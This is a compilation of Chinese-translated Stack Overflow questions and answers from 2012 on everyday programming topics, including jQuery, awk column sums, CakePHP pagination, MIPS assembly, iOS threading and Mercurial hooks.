另一个合理的用途是布隆过滤器： [http ://stromberg.dnsalias.org/~strombrg/drs-bloom-filter/](http://stromberg.dnsalias.org/~strombrg/drs-bloom-filter/)

...但是在 32 位操作系统上，mmap'd 内存区域的最大大小有点疼。

# jquery - jQuery如果位置等于检查

> ID：10218375
> 
> 赞同：1
> 
> 时间：2012-04-18T21:33:14.117
> 
> 标签：jquery

如何检查位置是否相等？

试图达到这样的目标：

```
if($(element).css({ left: "468px"}) == 468)

else 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-18T21:37:58.690

尝试这个：

```
if($(element).position().left == 468) 
```

该`.position()`方法有 2 个属性，顶部和左侧。这为您提供了相对于父元素的顶部和左侧。如果您需要相对于文档的位置，请使用`.offset()`：

```
if($(element).offset().left == 468) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-18T21:36:30.760

`.css()`接受[一个或两个参数](http://api.jquery.com/css/)。

```
if($(element).css('left') == '468px') {
  //  do stuff
} 
```

[http://jsfiddle.net/PeeHaa/mEP2V/](http://jsfiddle.net/PeeHaa/mEP2V/)

# javascript - 递归设置`display：none`，除了在特定元素内

> ID：10218377
> 
> 赞同：1
> 
> 时间：2012-04-18T21:33:37.787
> 
> 标签：javascript, css

如果我想**隐藏**`<div id="content">`除 a （**包括** 其自身）内的元素之外的所有元素`div#content`，我可以使用以下 CSS：

```
*
{
    visibility: hidden !important;
}

div#content, div#content *
{
    visibility: visible !important;
} 
```

关于这个解决方案需要注意的一点是隐藏元素仍然占用空间。不幸的是，并非所有元素都具有相同的`display`属性，因此您不能简单地将`visibility`上面替换为`display`.

使用 JavaScript，如何将所有元素设置为**不在**`<div id="#content">`“家庭”范围内的元素`display: none`？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-18T21:56:31.613

更改最少对象样式的通用解决方案，但确保其`#content`及其所有子元素可见，需要一种算法来遍历`#content`并隐藏每个级别的所有兄弟姐妹，而不会隐藏`#content`. 因为它从开始`#content`并上升，所以它从不隐藏`#content`.

```
function hideAllExcept(id) {
    var el = document.getElementById(id);
    while (el && el != document.body) {
        // go one level up
        var parent = el.parentNode;
        // get siblings of our ancesotr
        var siblings = parent.childNodes;
        // loop through the siblings of our ancestor, but skip out actual ancestor
        for (var i = 0, len = siblings.length; i < len; i++) {
            if (siblings[i] != el && siblings[i].nodeType == 1) {
                // only operate on element nodes
                siblings[i].style.display = "none";
            }
        }
        el = parent;
    }
}

hideAllExcept("content"); 
```

警告：这个第一个版本不隐藏作为#content 的祖先的兄弟的文本节点（#content 之外的所有其他文本节点都被隐藏，因为它们的父节点是隐藏的）。为了也隐藏这些文本节点，它们必须被包裹在`<span>`标签中，以便可以在`<span>`标签上设置样式，但我不知道 OP 是否需要这种复杂程度或希望以这种方式包裹文本节点。

为了完整起见，这里有一个版本，它将包装父兄弟文本节点，因此它们也可以设置为`display: none`. 这可能需要也可能不需要，具体取决于源 HTML：

```
function hideAllExcept(id) {
    var el = document.getElementById(id);
    while (el && el != document.body) {
        // go one level up
        var parent = el.parentNode;
        // get siblings of our ancesotr
        var siblings = parent.childNodes;
        // loop through the siblings of our ancestor, but skip out actual ancestor
        for (var i = 0, len = siblings.length; i < len; i++) {
            var node = siblings[i];
            if (node != el) {
                if (node.nodeType == 1) {
                    // only operate on element nodes
                    node.style.display = "none";
                } else if (node.nodeType == 3) {
                    // wrap text node in span object so we can hide it
                    var span = document.createElement("span");
                    span.style.display = "none";
                    span.className = "xwrap";
                    node.parentNode.insertBefore(span, node);
                    // Be wary of the dynamic siblings nodeList changing 
                    // when we add nodes.  
                    // It actually works here because we add one 
                    // and remove one so the nodeList stays constant.
                    span.appendChild(node);
                }
            }
        }
        el = parent;
    }
}

hideAllExcept("content");​ 
```

还有一个工作演示：http: [//jsfiddle.net/jfriend00/yVWDx/](http://jsfiddle.net/jfriend00/yVWDx/)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-18T21:41:08.847

尝试这个

```
var al = document.body.getElementsByTagName("*");

for(var i =0;i<al.length;i++)
{
    var elm = al[i];
    if(elm.parentNode.id != 'content') {
        elm.style.display = 'none';
    }
} 
```

# bash - 总结 bash 中所有文件的第二列

> ID：10218379
> 
> 赞同：1
> 
> 时间：2012-04-18T21:33:46.940
> 
> 标签：bash, sum

我有这种格式的 1-N 个文件：

文件 1：

```
1 1
2 5
3 0
4 0
5 0 
```

文件 2：

```
1 5
2 1
3 0
4 0
5 1 
```

作为输出，我想对所有文件的所有第二列求和，所以输出如下所示：

输出：

```
1 6
2 6
3 0
4 0
5 1 
```

非常感谢。

（或者，对我来说最好的方法是自动对所有具有相同名称但以不同数字开头的文件执行此操作，例如 1A.txt、2A.txt、3A.txt 作为一个输出和 1AD.txt、2AD。 txt, 3AD.txt 作为下一个输出）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T21:55:17.543

像这样的东西应该工作：

```
cat *A.txt | awk '{sums[$1] += $2;} END { for (i in sums) print i " " sums[i]; }'

cat *AD.txt | awk '{sums[$1] += $2;} END { for (i in sums) print i " " sums[i]; }' 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-18T21:48:05.477

快速求和解决方案可以在`awk`：

```
{ sum[$1] += $2; }
END { for (i in sum) print i " " sum[i]; } 
```

通过构建后缀列表然后对它们进行通配，可以最简单地对输入文件进行分组：

```
ls *.txt | sed -e 's/^[0-9]*//' | while read suffix; do
   awk '{ sum[$1] += $2; } END { for (i in sum) print i " " sum[i]; }' *$suffix > ${suffix}.sum
done 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-19T17:47:33.527

纯重击：

```
declare -a sum
for file in *A.txt; do
  while read a b; do
    ((sum[a]+=b))
  done < "$file"
done

for idx in ${!sum[*]}; do       # iterate over existing indices
  echo  "$idx ${sum[$idx]}"
done 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-19T00:11:45.433

```
#!/bin/bash

suffixes=$(find . -name '*.txt' | sed 's/.*[0-9][0-9]*\(.*\)\.txt/\1/' | sort -u)

for suffix in ${suffixes}; do
  paste *${suffix}.txt | awk '{sum = 0; for (i = 2; i <= NF; i += 2) sum += $i;
                               print $1" "sum}' > ${suffix}.sums.txt
done

exit 0 
```

# paypal - PayPal、Serve、Google Wallet ... 要求付款的 URL

> ID：10218380
> 
> 赞同：1
> 
> 时间：2012-04-18T21:33:51.403
> 
> 标签：paypal, payment

这不完全是一个发展问题，但我希望有人可以提供帮助，或者为我指明正确的方向。

我正在开发一个小型 Android 应用程序。它的一项功能将是允许用户共享链接以要求他人付款。例如，如果用户想要求另一个人使用 PayPal 支付某物，他可以输入他的 PayPal 电子邮件、主题、货币和金额，应用程序将生成一个类似的 URL（并可选择缩短它，提供统计信息，其他一些功能）：

```
https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&business=<email>&item_name=<description>&amount=<amount>&currency_code=<currency> 
```

我已经对此进行了测试，并且可以与 PayPal 一起使用。

我还想包括其他支付服务，如 Serve.com、GoogleWallet、IngDirect、AmazonPayments、WePay、Allpay 等。

我在查找等效 URL 以轻松传递所有参数以开始付款时遇到问题：每个服务的等效 URL 到提到的 PayPal 的。

我不在美国，所以我什至无法在serve.com 和其他网站上创建帐户。

任何帮助表示赞赏。

# iphone - 过滤键盘输入

> ID：10218388
> 
> 赞同：0
> 
> 时间：2012-04-18T21:34:24.957
> 
> 标签：iphone, objective-c, xcode

当用户在文本字段上输入内容时，我使用以下方法过滤掉非数字字符：

```
#define NUMBERS @"0123456789"

    - (BOOL)textField:(UITextField *)textFieldBeingChanged shouldChangeCharactersInRange:(NSRange)    range replacementString:(NSString *)string
{
    NSCharacterSet *cs;
    NSString *filtered;

    // Check for period
    if ([textFieldBeingChanged.text rangeOfString:@"."].location == NSNotFound)
    {
        cs = [[NSCharacterSet characterSetWithCharactersInString:NUMBERS] invertedSet];
        filtered = [[string componentsSeparatedByCharactersInSet:cs] componentsJoinedByString:@""];
        return [string isEqualToString:filtered];
    }

 } 
```

但是，它也屏蔽了键盘的 Return 键，这意味着通过按“return”键，不会调用 resignFirstResponder 的代码。有什么办法可以解决这个问题？我应该如何检查是否按下了“返回”键？

谢谢

# ios5 - 自定义 UITableViewDelefate 根本不起作用

> ID：10218397
> 
> 赞同：0
> 
> 时间：2012-04-18T21:35:17.630
> 
> 标签：ios5, uitableview

[所以，我在http://www.raywenderlich.com/5191/beginning-storyboards-in-ios-5-part-2](http://www.raywenderlich.com/5191/beginning-storyboards-in-ios-5-part-2)上遵循这个很棒的教程来开始 iOS 编程。

我决定我想为我的表格定制标题，并且一如既往地在stackoverflow上找到了很多信息，我应该在我的UITableViewDelegate中实现方法viewForHeaderInSection。

因此，由于我使用的是故事板，我想我会创建自己的 UITableView 类，然后将它用于故事板中的表格。

我还在我的表的“身份检查器”中的“自定义类”下选择了“MyTableView”作为“类”。

我的 UITableView (MyTableView.h) 子类如下所示：

```
#import <UIKit/Uikit.h>

@interface MyTableView : UITableView <UITableViewDelegate>

@end 
```

MyTableView.m 看起来像：

```
#import "MyTableView.h"

- (id)initWithFrame:(CGRect)frame
{
   self = [super initWithFrame:frame];
   if (self) {
         self.delegate = self;
   }
   return self;
}

// and then viewForHeaderInSection and heightForHeaderInSection is implemented below...

@end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-21T22:24:22.813

你应该继承 UITableViewController 而不是 UITableView。向您的项目添加新文件时（选择：Cocoa touch -> Objective-c 类）您应该选择“UITableViewController”的子类

您的 .h 文件应如下所示

```
@interface MyTableViewController : UITableViewController
@end 
```

在 .m 文件中，您应该实现`viewForHeaderInsection`，`heightForHeaderInSection` 然后转到情节提要并从对象库中拖动“UITableViewController”。将类设置为 MyTableViewController。

# javascript - 管理取消按钮的方法

> ID：10218403
> 
> 赞同：0
> 
> 时间：2012-04-18T21:35:46.180
> 
> 标签：javascript, jquery, html

假设我有一个对话框，其中包含一些复选框、单选按钮、文本输入等，它们代表一些选项。我通过单击页面上的某个链接打开此对话框。我希望能够通过单击对话框内的保存和取消按钮来保存和取消选项。

处理保存按钮看起来很简单 - 我只是通过控件并获取当前值。我想知道的是我应该如何更好地控制取消按钮。因此，我更改了对话框中的一些选项，然后改变主意并单击“取消”按钮。显然，我需要在更改之前将所有控件返回到它们的状态。

我该如何更好地做到这一点？我应该将对话框加载的当前状态保存到某些隐藏字段或属性吗？请分享你的想法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-18T21:38:34.880

我会在打开对话框时复制当前状态，在对话框中修改副本，当用户按下按钮时，用新状态替换当前状态或简单地删除相应的副本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T21:40:54.413

您可以只使用内置的重置将表单值恢复为默认值，然后处理保存，这实际上会将状态返回到进行更改之前的原始值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T21:44:28.120

`data`您可以在属性中保存当前保存的状态。在 HTML 中，此类属性看起来像`data-something="some value"`，但您可以简单地从 JavaScript 访问它。例如。jQuery 有它的快捷方式，看起来像`jQuery(element_selector).data('something')`. 您也可以从 JavaScript 中设置它，例如`jQuery(element_selector).data('something', 'some other value')`.

使用该机制，您可以最初设置这些值并在每次保存时覆盖它们。如果有人单击“取消”，您只需将控件/表单元素恢复到与您存储为与该元素关联的数据的值相匹配的状态。

请记住，此类数据与 DOM 元素相关联，因此删除它们会删除数据，但在这种情况下，这是一种非常干净和灵活的方法。

更多的：

*   关于`data-`属性：[http ://ejohn.org/blog/html-5-data-attributes/](http://ejohn.org/blog/html-5-data-attributes/)
*   jQuery的实现：[http ://api.jquery.com/data/](http://api.jquery.com/data/)

# cakephp - Cakephp Paginate Distinct 记录

> ID：10218406
> 
> 赞同：0
> 
> 时间：2012-04-18T21:35:55.727
> 
> 标签：cakephp, cakephp-1.3

所以这就是我想要做的。我的表说（课程）有多个具有相同 ID 的条目。

当我从分页中获取数据时，它会显示所有记录。因此，如果我有 3 条 ID 为 5 的记录，它将显示 5 号记录三次。

现在我想要的是它应该只显示一次记录。

我在网上搜索但找不到任何东西。

如果有人遇到此类问题并找到解决方案，请告诉我。

谢谢，

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-30T04:39:59.320

我遇到了你的问题，因为我有类似的问题。David Z 的解决方案对我不起作用，但我确实发现 $paginate 中的 group 变量对我有用。

因此，使用上面的代码示例，这就是我认为它应该工作的方式。

```
$paginate = array(
            'Courses'    => array(
            'limit'    => 20,
            'fields' => array('Courses.id'),
            'conditions' => $cond,
            'group'   => array('Courses.id'),
            'order'    => array('Courses.id' => 'asc')
    )
    ); 
```

为了希望能更清楚地了解对我有用的解决方案，我有属于公司的系统。对于我拥有的系统，我想获得一份独特公司的列表。这是我使用的确切代码，对我有用

```
$this->paginate = array ('fields' => array ('Company.*'),
                         'order' => array('Company.name' => 'ASC'),
                         'group' => array('Company.id'));
$this->set('companies', $this->paginate($this->Company->System)); 
```

希望这有帮助

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T21:56:53.207

查看 CakePHP 食谱，分页文档显示您可以覆盖 $paginate 成员。在幕后，这类似于为模型的 find('all') 传递参数。也许尝试设置参数以显式返回您对 distinct 关键字感兴趣的字段以缩小您需要的值？

```
class RecipesController extends AppController {

    var $paginate = array(
        'fields' => array('Model.field1', 'DISTINCT Model.field2')
    );

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T20:00:01.577

所以这是我的分页变量的样子：

```
var $paginate = array(
            'Courses'    => array(
                'limit'    => 20,
                'page'    => 1,
                'order'    => array(
                'Courses.id'    => 'asc')
),
); 
```

条件变量看起来像这样：

```
 $cond = array("Courses.id LIKE "=>$this->data['id_search'],
        "Courses.length LIKE "=>$this->data['length_search'], 
        "Courses.marks LIKE "=>$this->data['marks']
        ); 
```

这就是我所说的分页。

```
$data = $this->paginate('CdmaRfReport',$cond); 
```

我试着做

```
$paginate = array(
                'Courses'    => array(
                    'limit'    => 20,
                    'fields' => array('DISTINCT Courses.id'),
                    'page'    => 1,
                    'conditions' => $cond,
                    'group'   => array('id'),
                    'order'    => array(
                    'Courses.id'    => 'asc')
        )
        ); 
```

它似乎没有帮助。

我也试过

```
$cond = array("DISTINCT Courses.id "=>$this->data['id_search'],
        "Courses.length LIKE "=>$this->data['length_search'], 
        "Courses.marks LIKE "=>$this->data['marks']
        ); 
```

即使这个错误出来我也可能有问题。但我无法弄清楚。

任何建议请告诉我。

# coldfusion - 如何在 ColdFusion 中进行 Log Base 2

> ID：10218412
> 
> 赞同：2
> 
> 时间：2012-04-18T21:36:33.473
> 
> 标签：coldfusion

我正在尝试在 ColdFusion 中计算密码熵（我知道我可以在 JavaScript 中完成，但我喜欢在服务器和客户端上工作的一切）。为了做到这一点，我需要能够做一个 Log Base 2。

ColdFusion 有一个用于自然日志的 Log() 函数和一个用于 Log Base 10 的 Log10 函数，但我没有看到任何函数可以让我确定 Log 的基数。

我认为我需要使用 Java 来执行此操作，但我不确定执行此操作的最佳方法。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-18T21:44:07.360

如果你这样做`log(x)/log(2)`相当于 log base 2 of x

# c# - 高性能自定义用户字段

> ID：10218414
> 
> 赞同：1
> 
> 时间：2012-04-18T21:36:41.587
> 
> 标签：c#, sql, sql-server-ce, ddl

寻找自定义用户字段的示例/教程，而不是通过 EAV

由于性能等各种原因，EAV 将成为问题

*   有许多基本实体/表，每个都有超过 100000 条记录
*   可能会有十几个属性
*   记录将显示在平面 ui 网格中，包括。自定义字段，因此在保持性能的同时将它们展平将是一个问题

查看通过 DDL 启用此功能，其中所有自定义字段都将进入匹配表，例如

```
<tablename>_custom_<userid> 
```

并且所有用户属性都将映射到一列，每个元数据及其所有元数据都存储在元数据表中

在查询简单的地方检索会更简单

```
select  * 
from <tablename> A, tableName_custom_userid B 
where B.KeyField = A.KeyField --( perhaps using outer join, haven't gone that far yet ) 
```

想知道在路上是否有任何我需要注意的问题？

当然，任何样本/指针都会有助于启动这项工作

特别感谢有关将 DDL 用于 Sql Server compact 4 的任何建议

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T18:22:03.633

我见过的一种技术是使用一种“硬编码”的 EAV 模式。不要挂断电话！它适用于您正在谈论的数据集大小并且实际上并没有使用 EAV - 它只是 EAV 式的。

这个想法是有一组表来存储这些自定义属性，其中包含一些触发器（如下所述）。自定义属性表集存储有关属性的元数据（它使用的表、数据类型、约束等）。你可以很喜欢这个，但我没有必要。

您的元表上的触发器用于重新生成将基础+扩展汇总到数据库中的第一类对象的视图。因此，您有一个包含两者的员工视图，而不是表人员 + 员工扩展表。当您将新值放入自定义属性表时，触发器将重新滚动视图并包含新内容。如果你想发疯，你也可以让触发器重写存储过程。根据你的中间层代码的结构，你仍然会被迫重新编码一些，但是如果你应用读取数据的规则，无论如何都会出现这种情况。

在测试中，我发现对于您所说的相对较小的记录数，性能稍慢，但遵循大致相同的降级模式（记录数的 2 倍，慢约 2 倍）。

-- 编辑 --

我是怎么看它的，你有一个代表你的第一类对象的表，所以一行代表“人”，一行代表“员工”，等等。我们称之为 FCO。然后你有一个辅助表来存储代表 FCO 的表。我们称它为 Srcs.. 对于 person，会有一行，即 person 表。对于 Employee，将有两行，即 person 表和 Employee 扩展。还有第三个表，称为 Attribs，它存储构成 FCO 的表中的列。为简单起见，我们会说 Employee 有 ID、Name 和 Address，Employee 有 Hire Date 和 Department，显然 PersonID 指的是 Person 表。因此，FCO 表中的 2 行（人员和员工），Src 表中的 3 行，Attribs 中的 8 行。

该视图（我们将其称为 vw_Employee）从两个表中选择 PersonID、Name、Address、Hire Date、Department。它是由我们称为 OnMetadataChange 的 SQL 存储过程构建的。

该 SP 被触发（通过触发器或批处理），其目的是生成 CREATE VIEW 语句。它将遍历每个 First Class 对象，从哪些表中收集哪些字段构成视图，并基于此发出 CREATE 语句。因此 OnMetadataChange 为每个视图生成一个 DROP 和 CREATE，它生成一个动态 SQL 语句，该语句在 FCO 表中的每个条目执行一次。最好使用触发器来执行此操作，但不是必需的。希望您的 FCO 定义不会经常更改，并且当它们更改时，可能也会有代码发布。那时您可以运行 OnMetadataChange SP。

最终结果是一个 2 层数据库。这些视图构成了对应用程序有意义的 First Class Object 层。该应用程序仅使用视图。这些表构成了应用程序不应该关心的“物理”层。元表本质上是 FCO 层和物理层之间的映射。设置它需要一些时间，但它非常有效，并为您提供了 EAV 的许多好处，同时为您提供了 3nf 表的具体好处（可索引性等）。

如果您愿意，我可以在那里抛出一些示例 SQL。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T21:26:02.250

您遇到的部分问题是您试图将无模式数据存储在 SQL 数据库中，这不是它的优势。有三种方法可以让您的生活更轻松：

1）有一个存储序列化自定义字段的列，使用任何最方便的格式。例如，此列可以存储 xml。好处是您可以使用 SQL Server Compact 并且撤回记录是微不足道的。缺点是您总是必须拉/推整个 xml blob 才能进行更新，而且很难对任何自定义字段进行查询。

2) 升级到 SQL Server Express，并使用 XML 列。这与第一个建议几乎相同，只是 SQL Server 的任何服务器就绪版本都具有对 XML 数据的本机支持。这些列可以添加索引，并且数据中的字段可以在查询中使用。

3) 使用无模式数据库，如 MongoDB 或 CouchDB。这些数据库都是关于存储无模式数据的，因此您的自定义字段将与任何其他字段没有什么不同。因此，您可以索引和查询自定义字段。优点是自定义数据非常容易使用，缺点是您必须花一些时间重新考虑如何存储数据以适应其模型。

如果您不需要基于自定义字段进行查询，或者如果您可以在业务逻辑中查询自定义字段，那么第一个选项可以为您工作。在任何其他情况下，我会错误地选择功能比紧凑型更多的东西。如果成本是决定因素，SQL Server Express 和 MongoDB 都是免费的。

# php - CodeIgniter 会话变量未通过

> ID：10218417
> 
> 赞同：0
> 
> 时间：2012-04-18T21:36:59.800
> 
> 标签：php, codeigniter, session, cookies

我正在使用带有 CodeIgniter 框架的原生 PHP 会话 ($_SESSION)。

我有一个“登录”控制器加载视图，用户输入登录名和密码。用户提交登录表单后，会调用“登录”控制器的 authenticate() 方法。如果一切正常，我将一些数据添加到 $_SESSION 数组，然后我将用户重定向到“组织”控制器 myOrganisation() 方法。我在 Login/login() 、 Login/authenticate() 和 Organisation/myOrganisation() 方法中调用 session_start() ，但仍然没有通过会话，因为在 myOrganisation() 方法中会话是新的。

我通过创建 2 个测试 php 页面来测试我的 cookie 功能，我只是在其中回显会话 ID。它完美地工作。也许我没有把 session_start() 放在它需要的所有地方？（我把它们放在所有控制器方法中）。

登录控制器：

```
class Login extends CI_Controller {
public function index() {
        session_start();
        $this->load->view("Login/index", $data);

    public function authenticate() {
                    session_start();
                    $_SESSION['login'] = $login; //  everything is alright, redirect
        header("location: ".base_url()."Organisations/MyOrganisation"); 
```

组织负责人：

```
public function MyOrganisation() {
    session_start(); // here session is a new one, not passed
    if(isset($_SESSION['login'])) { 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T10:03:04.180

session_start() 也可以在构造函数中指定，而不是类中的每个方法。这意味着您的两个控制器都可以拥有：

```
function __construct () {
    ini_set("session.gc_maxlifetime", 14400);
    ini_set("session.cookie_domain", .yourdomain.com);
    session_set_cookie_params(14400, '/', .yourdomain.com);
    session_start();
} 
```

构造函数中的前 3 行是确保会话 cookie 在您的域下长期有效。

除此之外（而不是封闭的 index() 和 authenticate() 方法），$login 来自哪里？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-21T20:26:57.670

我不知道我所做的 session_start() 放置有什么问题，但解决问题的一件事是将它放在主文件夹的 index.php 中

# scala - Scala SBT CoffeeScripted，正确覆盖编译目标

> ID：10218423
> 
> 赞同：2
> 
> 时间：2012-04-18T21:37:36.927
> 
> 标签：scala, sbt, target, absolute-path

在黑暗中摸索，我只是求助于一个可悲的黑客（注意路径回溯）：

```
(resourceManaged in (Compile, CoffeeKeys.coffee)) <<= 
  (crossTarget in Compile)(_ / "../../../apache/static" / "js") 
```

有没有办法用coffeescripted-sbt指定*绝对目标写入路径？*[介绍/](https://github.com/softprops/coffeescripted-sbt)概述状态

> 您可以通过覆盖范围为您的配置和 CoffeeKeys.coffee 任务的 resourceManaged 设置来覆盖此行为。下面是一个示例，您可以附加到构建定义中，它将生成的 javascript 复制到 target/:scala-version/your_preference/js

太好了，但我想直接写入 apache 静态目录，而不是 sbt-eclipse 项目中的 4 层

应该注意：这些天我在 GitHub 上经常看到*Unicorn is Angry ，所以问题跟踪器并没有多大帮助。*

感谢您提供任何线索，我有什么工作，但我想知道如何正确设置绝对路径

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-21T10:31:11.127

```
(resourceManaged in (Compile, CoffeeKeys.coffee)) <<= 
  (crossTarget in Compile)(_ / "pref" / "js") 
```

相对于默认值设置编译目标，即“project_root/target/scala-version/”

解决方案非常简单：

```
resourceManaged in (Compile, CoffeeKeys.coffee) :=
  file("/absolute/path/to/apache/static/js") 
```

[SBT用户组线程](http://groups.google.com/group/simple-build-tool/browse_thread/thread/b0d22d6efa1e3310)

# assembly - MIPS - 修订版将 java 片段转换为 MIPS。制作程序但打印错误的数字？

> ID：10218425
> 
> 赞同：0
> 
> 时间：2012-04-18T21:37:57.420
> 
> 标签：assembly, mips

问题。编写与以下 Java 代码片段等效的 MIPS 汇编代码。

```
 int x = 1 ;
    int y = 3 ;
    int c = 2 ;
    x = y - c ;
    if (x != y) { x = y + 5 ; }
    else { x = c ; } ; 
```

这就是我目前所拥有的。

```
.data 
X: .word 1
Y: .word 3
C: .word 2
.text
main:
la $t1, X 
la $t2, Y
la $t3, C
lw $t1, ($t1)
lw $t2, ($t2)
lw $t3, ($t3)
sub $t1, $t2, $t3
li $v0, 1
beq $t1, $t2, iflabel
add $t1,$t3, 0 # sets x = c by adding zero to c and putting result in $t1 (register for x) used.
iflabel: add $t1,$t2,5
syscall
li $v0, 10 
```

据我所知，应该打印“8”，但 0 是 ?!?，不是家庭作业问题，只是关于 MIPS 的一些修订问题。我可以猜测我的 syscall 可能在错误的地方并且可能导致错误？，我正在使用 MARS 进行编程，因为我可以看到寄存器的内容并逐行运行，但仍然对我的问题没有帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T21:55:17.810

你的条件是倒退的：现在你有它，所以 X*等于*Y 它会加 5，但是从 Java 代码看来你想要它相反：

```
bne $t1, $t2, iflabel 
```

其次，您的 +5 代码流入另一个条件。在 if/else 块之后需要一个标签，并且在处理 if-true 代码后需要分支到它。

第三，您应该`$v0`在执行系统调用之前立即加载向量，之后没有理由这样做。

第四，[系统调用1](http://courses.missouristate.edu/KenVollmar/MARS/Help/SyscallHelp.html)需要整数在`$a0.`你可以直接添加Y+5或C+0 `$a0`。

最终代码应为：

```
.data 
X: .word 1
Y: .word 3
C: .word 2

.text
main:
la $t1, X 
la $t2, Y
la $t3, C
lw $t1, ($t1)
lw $t2, ($t2)
lw $t3, ($t3)
sub $t1, $t2, $t3
bne $t1, $t2, iflabel
add $a0,$t3, 0
b endif
iflabel: add $a0,$t2,5
endif:
li $v0, 1
syscall 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T21:47:03.783

你的整数在正确的寄存器中吗？从[这里](http://courses.missouristate.edu/KenVollmar/MARS/Help/SyscallHelp.html)看来它应该在`$a0`

# asp.net-mvc - 加载更多按钮和 seo

> ID：10218426
> 
> 赞同：2
> 
> 时间：2012-04-18T21:37:57.683
> 
> 标签：asp.net-mvc, seo

在一个图片库网站中，类似于 flickr 中的照片流，我们决定使用[yahoo 图像搜索](http://images.search.yahoo.com/search/images;_ylt=A0oG7k.yM49PAnUA8hRXNyoA?p=car&fr=yfp-t-701&fr2=piv-web)中的加载更多按钮，而不是分页功能。

但是我们有一个关于加载更多按钮的问题，它是关于 SEO，因为我知道搜索引擎不会捕捉到这个按钮并索引用户按下它后将显示的图像，因为一切都会以 ajax 方式发生而没有页面刷新。

有没有办法让这个按钮对 SEO 友好？有没有任何现有的网站这样做过，看看它是如何工作的？

我正在使用 MVC.net、jQuery、C# 和 EF4 构建我的网站

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T21:40:50.443

您应该为搜索引擎实现一个经典的分页系统，然后使用 Javascript 将其转换为加载更多按钮。
这称为渐进增强。

# uitextview - UITextView 外观延迟

> ID：10218429
> 
> 赞同：0
> 
> 时间：2012-04-18T21:38:14.800
> 
> 标签：uitextview

我有一个 tableView 和一个从 URL 获取数据并重新加载表的“重新加载”按钮，这是一个昂贵的操作（特别是 fetch 部分）。

我想在发生这种情况时向用户显示信息，所以我想我会在顶部放置一个“正在加载”的 UITextView，执行获取/重新加载操作，然后删除 UITextView。

这是代码：

```
- (IBAction)refreshData:(id)sender {

    UITextView *textView = [[UITextView alloc] initWithFrame:CGRectMake(0, self.view.frame.size.height-30, self.view.frame.size.width, 30)];
    [self.view addSubview:textView];
    textView.text = @"Loading..";
    textView.textColor = [UIColor whiteColor];
    textView.backgroundColor = [UIColor grayColor];
    textView.editable = NO;

    [self fetchData];
    [self.tableView reloadData];

    [textView removeFromSuperview];
} 
```

我得到的行为是 fetchData 在 UITextView 在屏幕上呈现之前执行。我知道这一点是因为我在 fetchData 中有 NSLogs，它在 UITextView 显示在屏幕上之前执行。

我在这里有什么明显的遗漏吗？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T22:05:18.093

替换`[self fetchData];`为

```
[self performSelectorInBackground:@selector(fetchData) withObject:nil]; 
```

然后在您的`fetchData`方法中，完成获取后，添加

```
[self performSelectorOnMainThread:@selector(fetchDataFinished) withObject:nil waitUntilDone:NO]; 
```

其中新方法`fetchDataFinished`定义为

```
-(void) fetchDataFinished{
    [self.tableView reloadData];
    [self.textView removeFromSuperview];
} 
```

请注意，您必须创建`textView`一个属性，以便在此方法中可以访问它。

对于您的特定情况，我没有尝试过上述方法，但我已经在许多类似情况下成功地使用了类似的结构。

# java - 在 run() 方法中使用 repaint() 更新图形？

> ID：10218432
> 
> 赞同：0
> 
> 时间：2012-04-18T21:38:25.080
> 
> 标签：java, swing, animation, java-2d

我在此处更新 Pong 游戏中的屏幕时遇到问题。run() 方法将形状绘制到图形 (myBuffer)，然后再绘制到 bufferedImage (myImage)。我正在为线程实现一个 run() 方法，以便桨可以同时移动。

我知道其他类（ball、bumper1、bumper2）在这个程序中工作，因为我在这个文件中使用相同的命令制作了 Pong，但没有 run() 方法。我在前一个中使用了一个监听器，它更新和刷新很好（只是对桨键相互干扰感到烦恼！:/）

我的猜测是，要么 1）线程不执行（不太可能，但不确定），要么 2）我使用 repaint() 的方式在线程中不起作用，或者 3）我遗漏了一些明显的东西。:}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-18T21:58:02.567

一个线程`run()`只执行一次该方法。要重复执行一个块，您可以使用无限循环：

```
public void run() {
    for (;;) {
        // your code
    }
} 
```

# mercurial - 如何为“hg 分支”设置钩子？

> ID：10218441
> 
> 赞同：1
> 
> 时间：2012-04-18T21:39:11.337
> 
> 标签：mercurial, branch, hook

我想编写一个每次运行时执行一些操作的钩子`hg branch branch_name`（例如，为 JIRA 票证设置“进行中”状态），但我找不到在分支期间运行的任何内容。有什么办法可以做到吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T00:17:55.977

这是`pre-<command>`每个命令的钩子（带有连字符）。请注意，这与任何可能存在的没有连字符的钩子不同，sush as `precommit`。

因此你可以这样做：

```
[hooks]
pre-bookmark = /usr/bin/notify_jira.sh ${HG_ARGS#bookmark } 
```

调用：

```
/usr/bin/notify_jira.sh PROJ-415 
```

当你运行时：

```
hg bookmark PROJ-415 
```

